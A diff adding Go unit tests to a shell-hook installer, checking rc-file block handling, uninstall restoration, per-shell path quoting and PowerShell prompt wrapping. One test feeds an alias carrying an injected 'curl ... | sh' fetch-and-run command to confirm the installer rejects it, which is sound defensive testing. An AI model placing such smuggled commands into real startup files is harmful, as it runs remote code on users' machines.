@@ -301,3 +301,133 @@ func TestNormalizeShellNames(t *testing.T) {
 		}
 	}
 }
+
+// A begin marker with no end means somebody edited the block by hand. The old
+// behaviour was to treat that as "no block found" and append a second one,
+// which left two copies of the hook installed and doubled every record.
+func TestInstallRefusesAHalfDeletedBlock(t *testing.T) {
+	m, home := newTestManager(t)
+	rc := filepath.Join(home, ".bashrc")
+	broken := "export A=1\n# " + blockBegin + "\n__wut_precmd() { :; }\n"
+	if err := os.WriteFile(rc, []byte(broken), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	rep, err := m.Install(port.InstallRequest{Shells: []string{"bash"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(rep.Changes) != 1 || rep.Changes[0].Err == "" {
+		t.Fatalf("expected the change to be refused, got %+v", rep.Changes)
+	}
+	after, err := os.ReadFile(rc)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(after) != broken {
+		t.Errorf("the file was modified anyway:\n%q", after)
+	}
+	if n := strings.Count(string(after), blockBegin); n != 1 {
+		t.Errorf("got %d begin markers, want 1", n)
+	}
+}
+
+// Uninstall removes the one separator newline install added, and nothing else.
+// Trimming every trailing newline ate blank lines the user had written.
+func TestUninstallKeepsTheUsersOwnTrailingBlankLines(t *testing.T) {
+	m, home := newTestManager(t)
+	rc := filepath.Join(home, ".bashrc")
+	original := "export A=1\n\n\n"
+	if err := os.WriteFile(rc, []byte(original), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := m.Install(port.InstallRequest{Shells: []string{"bash"}}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := m.Uninstall(port.InstallRequest{Shells: []string{"bash"}}); err != nil {
+		t.Fatal(err)
+	}
+	restored, err := os.ReadFile(rc)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(restored) != original {
+		t.Errorf("uninstall did not restore the file\n got: %q\nwant: %q", restored, original)
+	}
+}
+
+// An alias becomes a shell *function name*. No quoting protects that position,
+// so a value that is not a function name must never reach a startup file.
+func TestInstallRefusesAnAliasThatIsNotAFunctionName(t *testing.T) {
+	m, home := newTestManager(t)
+	rc := filepath.Join(home, ".bashrc")
+	if err := os.WriteFile(rc, []byte("export A=1\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := m.Install(port.InstallRequest{
+		Shells: []string{"bash"},
+		Alias:  "x; curl http://example.invalid/x.sh | sh #",
+	}); err == nil {
+		t.Fatal("a shell-injecting alias was accepted")
+	}
+	data, err := os.ReadFile(rc)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(data), "curl") {
+		t.Errorf("the alias reached the rc file:\n%s", data)
+	}
+}
+
+// Quoting is per shell, not per family. Elvish and PowerShell double a literal
+// quote; only the POSIX shells understand the '\” idiom, and emitting it
+// elsewhere produces a startup file that fails to parse.
+func TestPathsWithAQuoteAreQuotedByEachShellsOwnRules(t *testing.T) {
+	dir := "/home/o'brien/.local/state/wut/sessions"
+	p := Params{SessionsDir: dir}
+
+	posix := shQuote(dir)
+	if !strings.Contains(posix, `'\''`) {
+		t.Errorf("shQuote did not use the POSIX idiom: %s", posix)
+	}
+	for _, q := range []string{elvQuote(dir), psQuote(dir)} {
+		if strings.Contains(q, `\`) {
+			t.Errorf("quoted with a backslash, which these shells do not honour: %s", q)
+		}
+		if !strings.Contains(q, "o''brien") {
+			t.Errorf("quote was not doubled: %s", q)
+		}
+	}
+
+	spec, _ := Lookup("elvish")
+	if got := Render(spec, p); strings.Contains(got, `'\''`) {
+		t.Error("the elvish block still uses POSIX quoting")
+	}
+}
+
+// A Windows path ends in no backslash, but a directory one level up does, and
+// a Python raw string cannot end in a backslash at all.
+func TestPyQuoteHandlesWindowsPaths(t *testing.T) {
+	for _, in := range []string{`C:\Users\a\AppData\Local\wut\`, `C:\a"b`} {
+		got := pyQuote(in)
+		if strings.HasPrefix(got, `r"`) {
+			t.Errorf("pyQuote still emits a raw string: %s", got)
+		}
+		if !strings.HasSuffix(got, `"`) || len(got) < 2 {
+			t.Errorf("not a quoted string: %s", got)
+		}
+		if strings.Contains(in, `\`) && !strings.Contains(got, `\\`) {
+			t.Errorf("backslashes were not escaped: %s", got)
+		}
+	}
+}
+
+// Dot-sourcing the profile a second time must not wrap WUT's own prompt
+// wrapper, which recurses until PowerShell runs out of stack.
+func TestPowerShellPromptWrapperIsCapturedOnlyOnce(t *testing.T) {
+	spec, _ := Lookup("pwsh")
+	got := Render(spec, Params{SessionsDir: `C:\state`})
+	if !strings.Contains(got, "if (-not $global:WutInnerPrompt) { $global:WutInnerPrompt = $function:prompt }") {
+		t.Errorf("the prompt wrapper is captured unguarded:\n%s", got)
+	}
+}
